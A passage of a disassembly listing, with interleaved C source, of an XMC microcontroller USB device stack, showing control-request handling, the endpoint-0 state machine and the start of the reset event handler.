 8003c82:	e08c      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
			USBD_HandleEP0_Stall();
 8003c84:	f7ff fe6a 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003c88:	e089      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_SetDescriptor:
		/* Set Descriptor not supported, so stall */
		USBD_HandleEP0_Stall();
 8003c8a:	f7ff fe67 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003c8e:	e086      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_SetInterface:
		if (USB_DeviceState == DEVICE_STATE_Configured) {
 8003c90:	4b49      	ldr	r3, [pc, #292]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003c92:	781b      	ldrb	r3, [r3, #0]
 8003c94:	b2db      	uxtb	r3, r3
 8003c96:	2b04      	cmp	r3, #4
 8003c98:	d10c      	bne.n	8003cb4 <USB_Device_ProcessControlRequest+0x32c>
			/* TODO: Check if interface and altsetting exists and configuration is allowed, else stall */
			device.InterfaceSettings[USB_ControlRequest.wIndex] = USB_ControlRequest.wValue;
 8003c9a:	4b49      	ldr	r3, [pc, #292]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003c9c:	885b      	ldrh	r3, [r3, #2]
 8003c9e:	b29a      	uxth	r2, r3
 8003ca0:	4b47      	ldr	r3, [pc, #284]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003ca2:	889b      	ldrh	r3, [r3, #4]
 8003ca4:	b29b      	uxth	r3, r3
 8003ca6:	4619      	mov	r1, r3
 8003ca8:	b2d2      	uxtb	r2, r2
 8003caa:	4b44      	ldr	r3, [pc, #272]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003cac:	440b      	add	r3, r1
 8003cae:	f883 2138 	strb.w	r2, [r3, #312]	; 0x138
			break;
 8003cb2:	e074      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		if (USB_DeviceState == DEVICE_STATE_Addressed) {
 8003cb4:	4b40      	ldr	r3, [pc, #256]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003cb6:	781b      	ldrb	r3, [r3, #0]
 8003cb8:	b2db      	uxtb	r3, r3
 8003cba:	2b03      	cmp	r3, #3
 8003cbc:	d16c      	bne.n	8003d98 <USB_Device_ProcessControlRequest+0x410>
			USBD_HandleEP0_Stall();
 8003cbe:	f7ff fe4d 	bl	800395c <USBD_HandleEP0_Stall>
			break;
 8003cc2:	e06c      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		break;

	case REQ_SetFeature:
		/* we do not support test mode */
		if (Value == FEATURE_SEL_TestMode) {
 8003cc4:	7cfb      	ldrb	r3, [r7, #19]
 8003cc6:	2b02      	cmp	r3, #2
 8003cc8:	d102      	bne.n	8003cd0 <USB_Device_ProcessControlRequest+0x348>
			USBD_HandleEP0_Stall();
 8003cca:	f7ff fe47 	bl	800395c <USBD_HandleEP0_Stall>
			break;
 8003cce:	e066      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		/* configured state */
		if (USB_DeviceState == DEVICE_STATE_Configured) {
 8003cd0:	4b39      	ldr	r3, [pc, #228]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003cd2:	781b      	ldrb	r3, [r3, #0]
 8003cd4:	b2db      	uxtb	r3, r3
 8003cd6:	2b04      	cmp	r3, #4
 8003cd8:	d137      	bne.n	8003d4a <USB_Device_ProcessControlRequest+0x3c2>
			switch (Value) {
 8003cda:	7cfb      	ldrb	r3, [r7, #19]
 8003cdc:	2b00      	cmp	r3, #0
 8003cde:	d009      	beq.n	8003cf4 <USB_Device_ProcessControlRequest+0x36c>
 8003ce0:	2b01      	cmp	r3, #1
 8003ce2:	d15b      	bne.n	8003d9c <USB_Device_ProcessControlRequest+0x414>
			case FEATURE_SEL_DeviceRemoteWakeup:
				device.RemoteWakeUp = 1;
 8003ce4:	4a35      	ldr	r2, [pc, #212]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003ce6:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8003cea:	f043 0304 	orr.w	r3, r3, #4
 8003cee:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
				break;
 8003cf2:	e029      	b.n	8003d48 <USB_Device_ProcessControlRequest+0x3c0>
			case FEATURE_SEL_EndpointHalt:
				Index = USB_ControlRequest.wIndex & 0xFF & (uint8_t)XMC_USBD_ENDPOINT_NUMBER_MASK;
 8003cf4:	4b32      	ldr	r3, [pc, #200]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003cf6:	889b      	ldrh	r3, [r3, #4]
 8003cf8:	b29b      	uxth	r3, r3
 8003cfa:	f003 030f 	and.w	r3, r3, #15
 8003cfe:	817b      	strh	r3, [r7, #10]
				if (device.Endpoints[Index].IsConfigured == 0)
 8003d00:	897b      	ldrh	r3, [r7, #10]
 8003d02:	4a2e      	ldr	r2, [pc, #184]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003d04:	212c      	movs	r1, #44	; 0x2c
 8003d06:	fb01 f303 	mul.w	r3, r1, r3
 8003d0a:	4413      	add	r3, r2
 8003d0c:	7a1b      	ldrb	r3, [r3, #8]
 8003d0e:	f3c3 0300 	ubfx	r3, r3, #0, #1
 8003d12:	b2db      	uxtb	r3, r3
 8003d14:	2b00      	cmp	r3, #0
 8003d16:	d102      	bne.n	8003d1e <USB_Device_ProcessControlRequest+0x396>
					USBD_HandleEP0_Stall();
 8003d18:	f7ff fe20 	bl	800395c <USBD_HandleEP0_Stall>
				else {
					device.Endpoints[Index].IsHalted = 1;
					device.Driver->EndpointStall(USB_ControlRequest.wIndex,1);
				}
				break;
 8003d1c:	e013      	b.n	8003d46 <USB_Device_ProcessControlRequest+0x3be>
					device.Endpoints[Index].IsHalted = 1;
 8003d1e:	897b      	ldrh	r3, [r7, #10]
 8003d20:	4a26      	ldr	r2, [pc, #152]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003d22:	212c      	movs	r1, #44	; 0x2c
 8003d24:	fb01 f303 	mul.w	r3, r1, r3
 8003d28:	441a      	add	r2, r3
 8003d2a:	7a13      	ldrb	r3, [r2, #8]
 8003d2c:	f043 0304 	orr.w	r3, r3, #4
 8003d30:	7213      	strb	r3, [r2, #8]
					device.Driver->EndpointStall(USB_ControlRequest.wIndex,1);
 8003d32:	4b22      	ldr	r3, [pc, #136]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003d34:	681b      	ldr	r3, [r3, #0]
 8003d36:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003d38:	4a21      	ldr	r2, [pc, #132]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003d3a:	8892      	ldrh	r2, [r2, #4]
 8003d3c:	b292      	uxth	r2, r2
 8003d3e:	b2d2      	uxtb	r2, r2
 8003d40:	2101      	movs	r1, #1
 8003d42:	4610      	mov	r0, r2
 8003d44:	4798      	blx	r3
				break;
 8003d46:	bf00      	nop
			}
			break;
 8003d48:	e028      	b.n	8003d9c <USB_Device_ProcessControlRequest+0x414>
		}
		/* when addressed, only ep0 can be halted */
		if (USB_DeviceState == DEVICE_STATE_Addressed) {
 8003d4a:	4b1b      	ldr	r3, [pc, #108]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003d4c:	781b      	ldrb	r3, [r3, #0]
 8003d4e:	b2db      	uxtb	r3, r3
 8003d50:	2b03      	cmp	r3, #3
 8003d52:	d116      	bne.n	8003d82 <USB_Device_ProcessControlRequest+0x3fa>
			if (Value == FEATURE_SEL_EndpointHalt &&
 8003d54:	7cfb      	ldrb	r3, [r7, #19]
 8003d56:	2b00      	cmp	r3, #0
 8003d58:	d113      	bne.n	8003d82 <USB_Device_ProcessControlRequest+0x3fa>
					(USB_ControlRequest.bmRequestType & 0x3) == REQREC_ENDPOINT &&
 8003d5a:	4b19      	ldr	r3, [pc, #100]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003d5c:	781b      	ldrb	r3, [r3, #0]
 8003d5e:	f003 0303 	and.w	r3, r3, #3
			if (Value == FEATURE_SEL_EndpointHalt &&
 8003d62:	2b02      	cmp	r3, #2
 8003d64:	d10d      	bne.n	8003d82 <USB_Device_ProcessControlRequest+0x3fa>
					(USB_ControlRequest.wIndex & 0x00FF) == 0x0) {
 8003d66:	4b16      	ldr	r3, [pc, #88]	; (8003dc0 <USB_Device_ProcessControlRequest+0x438>)
 8003d68:	889b      	ldrh	r3, [r3, #4]
 8003d6a:	b29b      	uxth	r3, r3
 8003d6c:	b2db      	uxtb	r3, r3
					(USB_ControlRequest.bmRequestType & 0x3) == REQREC_ENDPOINT &&
 8003d6e:	2b00      	cmp	r3, #0
 8003d70:	d107      	bne.n	8003d82 <USB_Device_ProcessControlRequest+0x3fa>
				device.Endpoints[0].IsHalted = 1;
 8003d72:	4a12      	ldr	r2, [pc, #72]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003d74:	7a13      	ldrb	r3, [r2, #8]
 8003d76:	f043 0304 	orr.w	r3, r3, #4
 8003d7a:	7213      	strb	r3, [r2, #8]
				USBD_HandleEP0_Stall();
 8003d7c:	f7ff fdee 	bl	800395c <USBD_HandleEP0_Stall>
				break;
 8003d80:	e00d      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
			}
		}
		/* default behaviour is stall */
		USBD_HandleEP0_Stall();
 8003d82:	f7ff fdeb 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003d86:	e00a      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_SynchFrame:
		/* Not yet supported */
		USBD_HandleEP0_Stall();
 8003d88:	f7ff fde8 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003d8c:	e007      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	default:
		USBD_HandleEP0_Stall();
 8003d8e:	f7ff fde5 	bl	800395c <USBD_HandleEP0_Stall>
 8003d92:	e004      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		break;
 8003d94:	bf00      	nop
 8003d96:	e002      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		break;
 8003d98:	bf00      	nop
 8003d9a:	e000      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
			break;
 8003d9c:	bf00      	nop
	}
	device.IsSetupRecieved = 0;
 8003d9e:	4a07      	ldr	r2, [pc, #28]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003da0:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8003da4:	f36f 0341 	bfc	r3, #1, #1
 8003da8:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
 8003dac:	e000      	b.n	8003db0 <USB_Device_ProcessControlRequest+0x428>
		return;
 8003dae:	bf00      	nop
}
 8003db0:	3718      	adds	r7, #24
 8003db2:	46bd      	mov	sp, r7
 8003db4:	bd80      	pop	{r7, pc}
 8003db6:	bf00      	nop
 8003db8:	20000c9c 	.word	0x20000c9c
 8003dbc:	2000070c 	.word	0x2000070c
 8003dc0:	20000c94 	.word	0x20000c94

08003dc4 <USBD_HandleEP0_IN>:
 * \brief Handle complete IN transfer on EP0
 *
 * In \ref IN_DATA state it starts a receive and switches to \ref OUT_STATUS state.
 * In \ref IN_STATUS state its starts a new read of setup packets and switches to \ref IDLE.
 */
void USBD_HandleEP0_IN() {
 8003dc4:	b580      	push	{r7, lr}
 8003dc6:	af00      	add	r7, sp, #0
	if (device.EP0_State == IN_DATA) {
 8003dc8:	4b10      	ldr	r3, [pc, #64]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003dca:	f893 313b 	ldrb.w	r3, [r3, #315]	; 0x13b
 8003dce:	2b02      	cmp	r3, #2
 8003dd0:	d109      	bne.n	8003de6 <USBD_HandleEP0_IN+0x22>
		/* Read zero length out data packet */
		device.Driver->EndpointReadStart(0,0);
 8003dd2:	4b0e      	ldr	r3, [pc, #56]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003dd4:	681b      	ldr	r3, [r3, #0]
 8003dd6:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003dd8:	2100      	movs	r1, #0
 8003dda:	2000      	movs	r0, #0
 8003ddc:	4798      	blx	r3
		device.EP0_State = OUT_STATUS;
 8003dde:	4b0b      	ldr	r3, [pc, #44]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003de0:	2205      	movs	r2, #5
 8003de2:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	}
	if (device.EP0_State == IN_STATUS) {
 8003de6:	4b09      	ldr	r3, [pc, #36]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003de8:	f893 313b 	ldrb.w	r3, [r3, #315]	; 0x13b
 8003dec:	2b03      	cmp	r3, #3
 8003dee:	d10b      	bne.n	8003e08 <USBD_HandleEP0_IN+0x44>
		/* Request new setup packet */
		device.Driver->EndpointReadStart(device.Endpoints[0].Address,24);
 8003df0:	4b06      	ldr	r3, [pc, #24]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003df2:	681b      	ldr	r3, [r3, #0]
 8003df4:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003df6:	4a05      	ldr	r2, [pc, #20]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003df8:	7912      	ldrb	r2, [r2, #4]
 8003dfa:	2118      	movs	r1, #24
 8003dfc:	4610      	mov	r0, r2
 8003dfe:	4798      	blx	r3
		device.EP0_State = IDLE;
 8003e00:	4b02      	ldr	r3, [pc, #8]	; (8003e0c <USBD_HandleEP0_IN+0x48>)
 8003e02:	2201      	movs	r2, #1
 8003e04:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	}
}
 8003e08:	bf00      	nop
 8003e0a:	bd80      	pop	{r7, pc}
 8003e0c:	2000070c 	.word	0x2000070c

08003e10 <USBD_HandleEP0_OUT>:
 * \brief Handle complete OUT transfer on EP0
 *
 * Handles the OUT packet based on the state of endpoint 0. Starts a new read for new SETUP packets, when in \ref OUT_STATUS.
 * When endpoint 0 is in \ref OUT_DATA state, it handles the received data and starts a write transaction for \ref IN_STATUS.
 */
void USBD_HandleEP0_OUT() {
 8003e10:	b580      	push	{r7, lr}
 8003e12:	af00      	add	r7, sp, #0
	if (device.EP0_State == OUT_DATA) {
 8003e14:	4b12      	ldr	r3, [pc, #72]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e16:	f893 313b 	ldrb.w	r3, [r3, #315]	; 0x13b
 8003e1a:	2b04      	cmp	r3, #4
 8003e1c:	d10c      	bne.n	8003e38 <USBD_HandleEP0_OUT+0x28>
		/* Now we have the data for handling the request */
		USB_Device_ProcessControlRequest();
 8003e1e:	f7ff fdb3 	bl	8003988 <USB_Device_ProcessControlRequest>
		/* Zero length packet for status stage */
		device.Driver->EndpointWrite(ENDPOINT_DIR_MASK & 0,0,0);
 8003e22:	4b0f      	ldr	r3, [pc, #60]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e24:	681b      	ldr	r3, [r3, #0]
 8003e26:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003e28:	2200      	movs	r2, #0
 8003e2a:	2100      	movs	r1, #0
 8003e2c:	2000      	movs	r0, #0
 8003e2e:	4798      	blx	r3
		device.EP0_State = IN_STATUS;
 8003e30:	4b0b      	ldr	r3, [pc, #44]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e32:	2203      	movs	r2, #3
 8003e34:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	}
	if (device.EP0_State == OUT_STATUS) {
 8003e38:	4b09      	ldr	r3, [pc, #36]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e3a:	f893 313b 	ldrb.w	r3, [r3, #315]	; 0x13b
 8003e3e:	2b05      	cmp	r3, #5
 8003e40:	d10b      	bne.n	8003e5a <USBD_HandleEP0_OUT+0x4a>
		/* Request new setup packet */
		device.Driver->EndpointReadStart(device.Endpoints[0].Address,24);
 8003e42:	4b07      	ldr	r3, [pc, #28]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e44:	681b      	ldr	r3, [r3, #0]
 8003e46:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003e48:	4a05      	ldr	r2, [pc, #20]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e4a:	7912      	ldrb	r2, [r2, #4]
 8003e4c:	2118      	movs	r1, #24
 8003e4e:	4610      	mov	r0, r2
 8003e50:	4798      	blx	r3
		device.EP0_State = IDLE;
 8003e52:	4b03      	ldr	r3, [pc, #12]	; (8003e60 <USBD_HandleEP0_OUT+0x50>)
 8003e54:	2201      	movs	r2, #1
 8003e56:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	}
}
 8003e5a:	bf00      	nop
 8003e5c:	bd80      	pop	{r7, pc}
 8003e5e:	bf00      	nop
 8003e60:	2000070c 	.word	0x2000070c

08003e64 <USBD_HandleEP0_SETUP>:
 * Handles the setup package an switches to correct state. If data is send from host to device it switches into \ref OUT_DATA state.
 * When the hosts sends all data within the setup package and \ref wLength equals zero, starts processing the request and sends a
 * in status reponse including the switch to \ref IN_STATUS.
 * When the host expects data from the device, the function processes the control request and switches to \ref IN_DATA state.
 */
void USBD_HandleEP0_SETUP() {
 8003e64:	b580      	push	{r7, lr}
 8003e66:	b082      	sub	sp, #8
 8003e68:	af00      	add	r7, sp, #0
	/* read setup package from ep0 */
	int32_t ret_val = device.Driver->EndpointRead(0,(void*)&USB_ControlRequest,8);
 8003e6a:	4b21      	ldr	r3, [pc, #132]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003e6c:	681b      	ldr	r3, [r3, #0]
 8003e6e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003e70:	2208      	movs	r2, #8
 8003e72:	4920      	ldr	r1, [pc, #128]	; (8003ef4 <USBD_HandleEP0_SETUP+0x90>)
 8003e74:	2000      	movs	r0, #0
 8003e76:	4798      	blx	r3
 8003e78:	6078      	str	r0, [r7, #4]
#if NO_COPY_DRIVER
	MEMCPY(&USB_ControlRequest,device.Endpoints[0].OutBuffer,sizeof(USB_ControlRequest));
#endif
	device.IsSetupRecieved = true;
 8003e7a:	4a1d      	ldr	r2, [pc, #116]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003e7c:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8003e80:	f043 0302 	orr.w	r3, r3, #2
 8003e84:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	if (ret_val != 8 )
 8003e88:	687b      	ldr	r3, [r7, #4]
 8003e8a:	2b08      	cmp	r3, #8
 8003e8c:	d12c      	bne.n	8003ee8 <USBD_HandleEP0_SETUP+0x84>
		return;

	/* preprocess */
	/* if length is zero we have only a in_status phase */
	if (USB_ControlRequest.wLength==0) {
 8003e8e:	4b19      	ldr	r3, [pc, #100]	; (8003ef4 <USBD_HandleEP0_SETUP+0x90>)
 8003e90:	88db      	ldrh	r3, [r3, #6]
 8003e92:	b29b      	uxth	r3, r3
 8003e94:	2b00      	cmp	r3, #0
 8003e96:	d10d      	bne.n	8003eb4 <USBD_HandleEP0_SETUP+0x50>
		device.EP0_State = IN_STATUS;
 8003e98:	4b15      	ldr	r3, [pc, #84]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003e9a:	2203      	movs	r2, #3
 8003e9c:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
		USB_Device_ProcessControlRequest();
 8003ea0:	f7ff fd72 	bl	8003988 <USB_Device_ProcessControlRequest>
		device.Driver->EndpointWrite(0,0,0);
 8003ea4:	4b12      	ldr	r3, [pc, #72]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003ea6:	681b      	ldr	r3, [r3, #0]
 8003ea8:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003eaa:	2200      	movs	r2, #0
 8003eac:	2100      	movs	r1, #0
 8003eae:	2000      	movs	r0, #0
 8003eb0:	4798      	blx	r3
 8003eb2:	e01a      	b.n	8003eea <USBD_HandleEP0_SETUP+0x86>
	} else {
		if (USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_DIRECTION) {
 8003eb4:	4b0f      	ldr	r3, [pc, #60]	; (8003ef4 <USBD_HandleEP0_SETUP+0x90>)
 8003eb6:	781b      	ldrb	r3, [r3, #0]
 8003eb8:	b25b      	sxtb	r3, r3
 8003eba:	2b00      	cmp	r3, #0
 8003ebc:	da06      	bge.n	8003ecc <USBD_HandleEP0_SETUP+0x68>
			device.EP0_State = IN_DATA;
 8003ebe:	4b0c      	ldr	r3, [pc, #48]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003ec0:	2202      	movs	r2, #2
 8003ec2:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
			USB_Device_ProcessControlRequest();
 8003ec6:	f7ff fd5f 	bl	8003988 <USB_Device_ProcessControlRequest>
 8003eca:	e00e      	b.n	8003eea <USBD_HandleEP0_SETUP+0x86>
		}
		else {
			device.EP0_State = OUT_DATA;
 8003ecc:	4b08      	ldr	r3, [pc, #32]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003ece:	2204      	movs	r2, #4
 8003ed0:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
			/* Do not process request here, first read data */
			device.Driver->EndpointReadStart(0,USB_ControlRequest.wLength);
 8003ed4:	4b06      	ldr	r3, [pc, #24]	; (8003ef0 <USBD_HandleEP0_SETUP+0x8c>)
 8003ed6:	681b      	ldr	r3, [r3, #0]
 8003ed8:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003eda:	4a06      	ldr	r2, [pc, #24]	; (8003ef4 <USBD_HandleEP0_SETUP+0x90>)
 8003edc:	88d2      	ldrh	r2, [r2, #6]
 8003ede:	b292      	uxth	r2, r2
 8003ee0:	4611      	mov	r1, r2
 8003ee2:	2000      	movs	r0, #0
 8003ee4:	4798      	blx	r3
 8003ee6:	e000      	b.n	8003eea <USBD_HandleEP0_SETUP+0x86>
		return;
 8003ee8:	bf00      	nop
		}
	}
}
 8003eea:	3708      	adds	r7, #8
 8003eec:	46bd      	mov	sp, r7
 8003eee:	bd80      	pop	{r7, pc}
 8003ef0:	2000070c 	.word	0x2000070c
 8003ef4:	20000c94 	.word	0x20000c94

08003ef8 <USBD_SignalDeviceEventHandler>:
 * The device can have several events, where it notifies the application about.
 *
 * \note Not all events are available on all chip series. (Power Events are only supported on XMC4500)
 * \see USB_USBD_EVENT
 */
void USBD_SignalDeviceEventHandler(XMC_USBD_EVENT_t event) {
 8003ef8:	b580      	push	{r7, lr}
 8003efa:	b084      	sub	sp, #16
 8003efc:	af00      	add	r7, sp, #0
 8003efe:	4603      	mov	r3, r0
 8003f00:	71fb      	strb	r3, [r7, #7]
	int i;
	switch (event) {
 8003f02:	79fb      	ldrb	r3, [r7, #7]
 8003f04:	2b09      	cmp	r3, #9
 8003f06:	f200 80fd 	bhi.w	8004104 <USBD_SignalDeviceEventHandler+0x20c>
 8003f0a:	a201      	add	r2, pc, #4	; (adr r2, 8003f10 <USBD_SignalDeviceEventHandler+0x18>)
 8003f0c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8003f10:	08004067 	.word	0x08004067
 8003f14:	08004055 	.word	0x08004055
 8003f18:	08004043 	.word	0x08004043
 8003f1c:	08004049 	.word	0x08004049
 8003f20:	08003f39 	.word	0x08003f39
 8003f24:	08004105 	.word	0x08004105
 8003f28:	080040ed 	.word	0x080040ed
 8003f2c:	080040dd 	.word	0x080040dd
 8003f30:	08004105 	.word	0x08004105
 8003f34:	0800403d 	.word	0x0800403d
	case XMC_USBD_EVENT_RESET:
		USB_DeviceState = DEVICE_STATE_Default;
 8003f38:	4b74      	ldr	r3, [pc, #464]	; (800410c <USBD_SignalDeviceEventHandler+0x214>)
 8003f3a:	2202      	movs	r2, #2
 8003f3c:	701a      	strb	r2, [r3, #0]
		device.EP0_State = IDLE;
 8003f3e:	4b74      	ldr	r3, [pc, #464]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f40:	2201      	movs	r2, #1
 8003f42:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
		device.RemoteWakeUp = 0;
 8003f46:	4a72      	ldr	r2, [pc, #456]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f48:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8003f4c:	f36f 0382 	bfc	r3, #2, #1
 8003f50:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
		/* Reset endpoints and configuration */
		for (i=0;i<(uint8_t)XMC_USBD_NUM_EPS; i++) {
 8003f54:	2300      	movs	r3, #0
 8003f56:	60fb      	str	r3, [r7, #12]
 8003f58:	e050      	b.n	8003ffc <USBD_SignalDeviceEventHandler+0x104>
			device.Endpoints[i].InInUse = 0;
 8003f5a:	4a6d      	ldr	r2, [pc, #436]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f5c:	68fb      	ldr	r3, [r7, #12]
 8003f5e:	212c      	movs	r1, #44	; 0x2c
 8003f60:	fb01 f303 	mul.w	r3, r1, r3
 8003f64:	441a      	add	r2, r3
 8003f66:	8913      	ldrh	r3, [r2, #8]
 8003f68:	f36f 1304 	bfc	r3, #4, #1
 8003f6c:	8113      	strh	r3, [r2, #8]
			device.Endpoints[i].OutInUse = 0;
 8003f6e:	4a68      	ldr	r2, [pc, #416]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f70:	68fb      	ldr	r3, [r7, #12]
 8003f72:	212c      	movs	r1, #44	; 0x2c
 8003f74:	fb01 f303 	mul.w	r3, r1, r3
 8003f78:	441a      	add	r2, r3
 8003f7a:	8913      	ldrh	r3, [r2, #8]
 8003f7c:	f36f 03c3 	bfc	r3, #3, #1
 8003f80:	8113      	strh	r3, [r2, #8]
			device.Endpoints[i].IsHalted = 0;
 8003f82:	4a63      	ldr	r2, [pc, #396]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f84:	68fb      	ldr	r3, [r7, #12]
 8003f86:	212c      	movs	r1, #44	; 0x2c
 8003f88:	fb01 f303 	mul.w	r3, r1, r3
 8003f8c:	441a      	add	r2, r3
 8003f8e:	7a13      	ldrb	r3, [r2, #8]
 8003f90:	f36f 0382 	bfc	r3, #2, #1
 8003f94:	7213      	strb	r3, [r2, #8]
			if (i!=0 && device.Endpoints[i].IsConfigured) {
 8003f96:	68fb      	ldr	r3, [r7, #12]
 8003f98:	2b00      	cmp	r3, #0
 8003f9a:	d02c      	beq.n	8003ff6 <USBD_SignalDeviceEventHandler+0xfe>
 8003f9c:	4a5c      	ldr	r2, [pc, #368]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003f9e:	68fb      	ldr	r3, [r7, #12]
 8003fa0:	212c      	movs	r1, #44	; 0x2c
 8003fa2:	fb01 f303 	mul.w	r3, r1, r3
 8003fa6:	4413      	add	r3, r2
 8003fa8:	7a1b      	ldrb	r3, [r3, #8]
 8003faa:	f3c3 0300 	ubfx	r3, r3, #0, #1
 8003fae:	b2db      	uxtb	r3, r3
 8003fb0:	2b00      	cmp	r3, #0
 8003fb2:	d020      	beq.n	8003ff6 <USBD_SignalDeviceEventHandler+0xfe>
				device.Driver->EndpointUnconfigure(device.Endpoints[i].Address);
 8003fb4:	4b56      	ldr	r3, [pc, #344]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003fb6:	681b      	ldr	r3, [r3, #0]
 8003fb8:	6a1b      	ldr	r3, [r3, #32]
 8003fba:	4955      	ldr	r1, [pc, #340]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003fbc:	68fa      	ldr	r2, [r7, #12]
 8003fbe:	202c      	movs	r0, #44	; 0x2c
 8003fc0:	fb00 f202 	mul.w	r2, r0, r2
 8003fc4:	440a      	add	r2, r1
 8003fc6:	3204      	adds	r2, #4
 8003fc8:	7812      	ldrb	r2, [r2, #0]
 8003fca:	4610      	mov	r0, r2
 8003fcc:	4798      	blx	r3
				device.Endpoints[i].IsConfigured = 0;
 8003fce:	4a50      	ldr	r2, [pc, #320]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003fd0:	68fb      	ldr	r3, [r7, #12]
 8003fd2:	212c      	movs	r1, #44	; 0x2c
 8003fd4:	fb01 f303 	mul.w	r3, r1, r3
 8003fd8:	441a      	add	r2, r3
 8003fda:	7a13      	ldrb	r3, [r2, #8]
 8003fdc:	f36f 0300 	bfc	r3, #0, #1
 8003fe0:	7213      	strb	r3, [r2, #8]
				device.Endpoints[i].IsEnabled = 0;
 8003fe2:	4a4b      	ldr	r2, [pc, #300]	; (8004110 <USBD_SignalDeviceEventHandler+0x218>)
 8003fe4:	68fb      	ldr	r3, [r7, #12]
 8003fe6:	212c      	movs	r1, #44	; 0x2c
 8003fe8:	fb01 f303 	mul.w	r3, r1, r3
 8003fec:	441a      	add	r2, r3
 8003fee:	7a13      	ldrb	r3, [r2, #8]
 8003ff0:	f36f 0341 	bfc	r3, #1, #1
 8003ff4:	7213      	strb	r3, [r2, #8]
		for (i=0;i<(uint8_t)XMC_USBD_NUM_EPS; i++) {
 8003ff6:	68fb      	ldr	r3, [r7, #12]
 8003ff8:	3301      	adds	r3, #1
 8003ffa:	60fb      	str	r3, [r7, #12]
 8003ffc:	68fb      	ldr	r3, [r7, #12]
 8003ffe:	2b06      	cmp	r3, #6
